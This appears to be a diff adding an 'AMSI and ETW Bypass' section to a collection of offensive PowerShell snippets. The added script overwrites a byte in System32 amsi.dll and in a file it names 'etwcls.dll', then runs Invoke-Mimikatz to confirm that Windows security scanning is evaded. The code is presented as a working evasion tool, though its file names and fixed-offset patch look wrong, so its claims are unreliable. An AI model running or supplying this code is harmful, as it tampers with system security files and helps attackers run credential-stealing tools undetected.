@@ -130,3 +130,27 @@ $output = $process.StandardOutput.ReadToEnd()
 $process.WaitForExit()
 Write-Host $output
 ```
+
+
+# AMSI and ETW Bypass , tested using the forbidden string 'Invoke-Mimiktaz'
+```powershell
+ # AMSI and ETW Bypass
+
+$AmsiBypass = {
+  $AmsiDllPath = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'windir').'windir' + '\System32\amsi.dll'
+  $AmsiDll = [System.IO.File]::ReadAllBytes($AmsiDllPath)
+  $AmsiDll[0xB4] = 0xB0
+  [System.IO.File]::WriteAllBytes($AmsiDllPath, $AmsiDll)
+  }
+
+$EtwBypass = {
+  $EtwDllPath = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'windir').'windir' + '\System32\etwcls.dll'
+  $EtwDll = [System.IO.File]::ReadAllBytes($EtwDllPath)
+  $EtwDll[0xB4] = 0xB0
+  [System.IO.File]::WriteAllBytes($EtwDllPath, $EtwDll)
+  }
+Invoke-Command -ScriptBlock $AmsiBypass
+Invoke-Command -ScriptBlock $EtwBypass
+# Test Forbidden String
+Invoke-Mimikatz
+```
